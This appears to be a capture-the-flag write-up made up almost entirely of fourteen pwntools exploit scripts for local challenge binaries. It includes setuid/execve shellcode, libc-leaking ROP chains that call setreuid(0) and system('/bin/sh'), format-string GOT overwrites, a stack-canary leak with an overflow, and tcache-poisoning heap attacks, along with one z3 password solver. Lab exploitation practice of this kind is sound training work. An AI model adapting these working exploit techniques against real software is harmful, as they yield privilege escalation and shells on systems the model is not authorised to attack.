### CTF7 Shellcode

##### Challenge 1

```python
from pwn import *

path  = '/challenge/final_level1'
exe = ELF(path)
context.binary = exe


set_binsh = """
nop
push rsp
pop rax
"""
for b in b'/bin/sh':
  set_binsh += """
  nop
  movb bl, {}
  nop
  movb [rax],bl
  nop
  addb al,1
  """.format(hex(b))

setuid = """
nop
push 0x71 
nop
push 0
nop
pop rdi
pop rax
nop
syscall
"""
sh_raw = """
nop
push rsp
pop rdi
nop
push 0
nop
push 0
nop
push 0x3b
nop
pop rax
pop rdx
nop
nop
pop rsi
nop
syscall
"""
code = set_binsh + setuid + sh_raw
payload = asm(code)

# gen_sh()
print(hex(len(payload)))
# gen_sh()
io = process(path)
# shellcode = shellcraft.cat('/flag')
# print(shellcode)
# print(shellcraft.setreuid(0))
# print(shellcraft.sh())
# wait_for_debugger(io.pid)
io.send(payload)
io.interactive()

```

##### Challenge 2

```python
from pwn import *

path = '/challenge/final_level2'
exe = ELF(path)
context.binary = exe
libc = exe.libc
io = process(path)


rop1 = ROP(exe)
rop1.puts(exe.got['puts'])
rop1.call(exe.sym['vuln'])

io.recvuntil('...\n')
io.sendline(cyclic(0x58)+bytes(rop1))
puts_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym['puts']
rop2 = ROP(exe)
rop2.call(libc.sym['setreuid'], [0])
rop2.call(exe.sym['vuln']+1)
io.sendline(cyclic(0x58)+bytes(rop2))

rop3 = ROP(exe)
rop3.call(libc.sym['system'], [next(libc.search(b'/bin/sh'))])

io.sendline(cyclic(0x58)+bytes(rop3))

io.interactive()
```

##### Challenge 3

```python
import ctypes
from pwnlib.util.proc import wait_for_debugger
from pwn import *
path = "/challenge/final_level3"
exe = ELF(path)
context.binary = exe
io = process(path)


def detrans(buf):
  mod = 5
  end = len(buf)-1
  plain = [0]*len(buf)
  for j in range(end // 2+1):
    def brute() -> bool:
      for p1 in range(0x100):
        for p2 in range(0x100):
          if p2+mod <= 0xff:
            c1 = mod + p2
          else:
            c1 = mod+1+p2
          if mod <= p1:
            c2 = p1-mod
          else:
            c2 = p1-mod-1
          if buf[j] == ctypes.c_uint8(c1).value and buf[end-j] == ctypes.c_uint8(c2).value:
            plain[j] = p1
            plain[end - j] = p2
            return True
      return False
    if brute():
      mod += 3
      continue
    else:
      print("not found")
  return plain


sc = asm(shellcraft.setreuid(0)+shellcraft.sh())
io.send(bytes(detrans(sc)))
io.interactive()


```

##### Challenge 4

```python
export zpjxd=aaaaap__a__s_wso_r_d_


import z3
password = [z3.BitVec('p%d' % i, 8) for i in range(0x10)]
dest = [p for p in password]
for j in range(8):
  if (j > 3):
    dest[j] = dest[2 * j]
  else:
    dest[j] = dest[3 * j]
solver = z3.Solver()
for i in range(8):
  solver.add(dest[i] == b'password'[i])
print(solver.check())
ans = ''
mod = solver.model()
for p in password:
  try:
    ans += chr(mod[p].as_long())
  except:
    ans+='_'
print(ans)
```

##### Challenge 5

```python
from pwn import *
path = "/challenge/final_level5"
exe = ELF(path)
io = process(path, env={'cepxb': b'ab' +
             bytes([0xd1, 0xc5, 0xcc, 0x5d, 0xf4, 0xa0, 0xee, 0xbd,])})

io.interactive()

```

##### Challenge 6

```python
from pwn import *
path = "/challenge/final_level6"
exe = ELF(path)
context.binary = exe
io = process(path)

rop = ROP(exe)
rop.call(exe.sym['almostWin'], [5474, exe.sym['win']])
payload = cyclic(0x570+8)+bytes(rop)
io.sendline(payload)
io.interactive()

```

##### Challenge 7

```python
from pwn import *
path = "/challenge/final_level7"
exe = ELF(path)
context.binary = exe
io = process(path)

target_addr = 0x40090A
rop = ROP(exe)
rop.call(target_addr, [123,1])
payload = cyclic(0x570+8)+bytes(rop)
io.sendline(payload)
io.interactive()

```

##### Challenge 8

```python
from pwn import *
path = "/challenge/final_level8"
exe = ELF(path)
context.binary = exe
io = process(path)

payload = cyclic(264)+p32(1)+p32(20)
io.sendline(payload)
io.interactive()

```

##### Challenge 9

```python
from pwn import *
path = "/challenge/final_level9"
exe = ELF(path)
context.binary = exe


def exec_fmt(payload):
  io = process(path)
  io.sendline(payload)
  return io.recvuntil(b'do?\n')



auto = FmtStr(exec_fmt)
io = process(path)

def send(payload):
  print(payload,len(payload))
  io.send(payload)


auto.execute_fmt = send

auto.write(0x6010cc, (0x1 << 32) + 0xaaaa)

auto.write(exe.got['putchar'], exe.sym['win'])
auto.execute_writes()
io.interactive()


```

##### Challenge 10

```python
from pwn import *
path = "/challenge/final_level10"
exe = ELF(path)
libc = exe.libc
context.binary = exe


def exec_fmt(payload):
  io = process(path)
  io.recvuntil(b'located\n')
  io.sendline(b'a')
  io.recvuntil(b'Time to inject shellcode\n', drop=True)
  io.sendline(b'a')
  io.recvuntil(b'address\n')
  io.sendline(payload)
  data = io.recv()
  io.close()
  return data


auto = FmtStr(exec_fmt)
io = process(path)


def send(payload):
  print(len(payload))
  io.sendline(payload)
  data = io.recv()
  return data


io.recvuntil(b'located\n')

io.sendline(b'%7$p\n\n\n\n'+asm(shellcraft.cat('/flag')))
data = io.recvuntil(b'\n', drop=True)
buf = int(data, 16) - 392
io.recvuntil(b'Time to inject shellcode\n', drop=True)
io.sendline(b'a')

auto.execute_fmt = send
print(auto.offset, auto.padlen, auto.numbwritten)
payload = fmtstr_payload(auto.offset, write_size='short', writes={
    exe.got['putchar']: buf+8}, numbwritten=auto.numbwritten)
print(len(payload))
io.recvuntil(b'address\n')
io.sendline(payload)
# auto.execute_writes()
io.recv()
io.interactive()

```
##### Challenge 11

```python
from pwn import *
path = "/challenge/final_level11"
exe = ELF(path)
context.binary = exe
io = process(path)
io.recvuntil(b'value\n')
io.sendline(b'%%%d$pEENNDD' % 227)
data = io.recvuntil(b'EENNDD', drop=True)
canary = int(data, 16)
io.sendline(cyclic(0x640-8)+p64(canary)+cyclic(8)+p64(exe.sym['win']))
io.interactive()

```
##### Challenge 12

```python

from pwn import *
path = "/challenge/final_level12"
exe = ELF(path)
libc = exe.libc
context.binary = exe


io = process(path)


def exec(payload):
  io.recvuntil(b'Enter your name:\n')
  io.sendline(payload)
  io.recvuntil(b'...\n')
  data = _io.recvuntil(b'Is that the name you wish to use [y/n]?\n', drop=True)
  io.sendline(b'n')
  return data

auto = FmtStr(exec, offset=18)

leak = auto.leak_stack(6)
i = 6 + (0x7FFC557EEA50-0x7FFC557EE6D0)//8
exe.address = auto.leak_stack(i+5) - (exe.sym['main']+0x76)
auto.write(leak-0x28, exe.sym['win'])
auto.execute_writes()
io.sendline('1')
io.recv()
io.sendline('y')
io.interactive()

```
##### Challenge 13

```python
from pwn import *
path = "/challenge/final_level13"
exe = ELF(path)


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """
  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  line = p.recvuntil("\n\n---")
  return line[:-5]


CHUNK_SIZE = 0x40
io = process(path)
add(io, "data", CHUNK_SIZE)
delete(io, 0)
delete(io, 0)
delete(io, 0)
add(io, "/flag", 0x80)
add(io, p64(exe.got['free']), CHUNK_SIZE)
add(io, "data", CHUNK_SIZE)
add(io, p64(exe.sym['win']), CHUNK_SIZE)
io.sendline("3")
sleep(0.1)
io.sendline("1")
io.interactive()

```
##### Challenge 14

```python
from pwn import *
path = "/challenge/final_level14"
exe = ELF(path)


def add(p, content, size=None):
  """
  scaffolding for communitcathing with the program
  """
  if not size:
    size = len(content)
  p.sendlineafter("Choice:", '1')
  p.sendlineafter("Size of the chunk?:", str(size))
  p.sendafter("Content:", content)
  line = p.recvregex("Chunk (\d+) is created")
  res = re.match(b"Chunk (\d+) is created", line)
  idx = int(res.group(1))
  return idx


def edit(p, idx, content):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '2')
  p.sendlineafter("Index:", str(idx))
  p.sendafter("New content:", content)
  p.recvuntil("updated successfully!")


def delete(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '3')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("deleted successfully!")


def show(p, idx):
  """
  scaffolding for communitcathing with the program
  """
  p.sendlineafter("Choice:", '4')
  p.sendlineafter("Index:", str(idx))
  p.recvuntil("is:")
  line = p.recvuntil("\n\n---")
  return line[:-5]


CHUNK_SIZE = 0x40
io = process(path)
io.recvuntil(b'gift: ')
puts_addr = io.recvline()
libc = exe .libc
libc.address = int(puts_addr, 16) - libc.sym['puts']
add(io, "data", CHUNK_SIZE)
delete(io, 0)
delete(io, 0)
add(io, "/bin/sh", 0x100)
add(io, p64(exe.got['raise']), CHUNK_SIZE)
add(io, p64(exe.got['raise']), CHUNK_SIZE)
got = p64(libc.sym['setreuid']) + p64(libc.sym['system'])
add(io, got, CHUNK_SIZE)
show(io, 0)

io.sendline('3')

io.sendline('1')

io.sendline('cat /flag')
io.interactive()

```